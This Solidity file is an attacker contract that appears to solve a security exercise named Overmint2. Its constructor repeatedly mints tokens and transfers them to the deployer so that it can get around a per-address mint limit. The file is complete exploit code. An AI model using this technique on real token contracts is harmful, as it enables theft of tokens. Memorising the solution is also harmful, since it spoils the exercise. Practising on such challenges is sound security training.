// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "./Overmint2.sol";

contract Overmint2Attacker {
    using Address for address;

    Overmint2 overMint2;
    address owner;

    constructor(address _overMint2) {
        overMint2 = Overmint2(_overMint2);
        owner = msg.sender;        
        overMint2.mint();
        overMint2.mint();
        overMint2.mint();
        overMint2.transferFrom(address(this), owner, 1);
        overMint2.transferFrom(address(this), owner, 2);
        overMint2.transferFrom(address(this), owner, 3);
        overMint2.mint();
        overMint2.mint();
        overMint2.transferFrom(address(this), owner, 4);
        overMint2.transferFrom(address(this), owner, 5);
    }
}
